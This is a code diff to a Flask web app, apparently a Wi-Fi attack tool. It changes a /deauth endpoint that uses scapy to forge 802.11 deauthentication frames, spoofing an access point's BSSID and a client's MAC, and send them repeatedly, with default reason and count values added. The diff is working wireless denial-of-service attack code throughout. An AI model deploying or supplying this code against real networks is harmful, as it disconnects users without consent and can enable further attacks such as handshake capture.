@@ -82,12 +82,18 @@ def survey_channels(uuid, option):
 @app.route("/deauth/<string:interface>/<string:reason>/<string:count>/<string:behavior>")
 def deauth(interface, reason, count, behavior):
     interface = json.loads(interface)['interface']
-    reason = int(json.loads(reason)['reason'])
-    count = int(json.loads(count)['count'])
+    try:
+        reason = int(json.loads(reason)['reason'])
+    except ValueError:
+        reason = 7
+    try:
+        count = int(json.loads(count)['count'])
+    except ValueError:
+        count = 64
     behavior = json.loads(behavior)['behavior']
     print(interface, reason, count, behavior)
 
-    def shoot():
+    def shoot(behavior, count):
         dot11_bssid = scapy.layers.dot11.Dot11(
             type=0,
             subtype=12,
@@ -95,6 +101,10 @@ def deauth(interface, reason, count, behavior):
             addr2=mac.bssid,
             addr3=mac.bssid,
         )
+        deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
+        frame_bssid = scapy.layers.dot11.RadioTap() / dot11_bssid / deauth_frame
+        # If behavior is set to true, deauth frames of the same count will be sent to the target's BSSID using the
+        # targets's MAC
         dot11_client = scapy.layers.dot11.Dot11(
             type=0,
             subtype=12,
@@ -102,13 +112,13 @@ def deauth(interface, reason, count, behavior):
             addr2=mac.mac,
             addr3=mac.bssid
         )
-        deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
-        frame_bssid = scapy.layers.dot11.RadioTap() / dot11_bssid / deauth_frame
         frame_client = scapy.layers.dot11.RadioTap() / dot11_client / deauth_frame
-        sendp(frame_bssid, iface=interface, count=count, inter=0.100)
-        sendp(frame_client, iface=interface, count=count, inter=0.100)
+        for num in range(0, count):
+            sendp(frame_bssid, iface=interface, count=1)
+            if behavior:
+                sendp(frame_client, iface=interface, count=1)
 
-    shoot()
+    shoot(behavior=behavior, count=count)
     return f"{count} deauths sent to {mac.mac} from {mac.bssid}"
 
 @app.route('/test', methods=['POST', 'GET'])
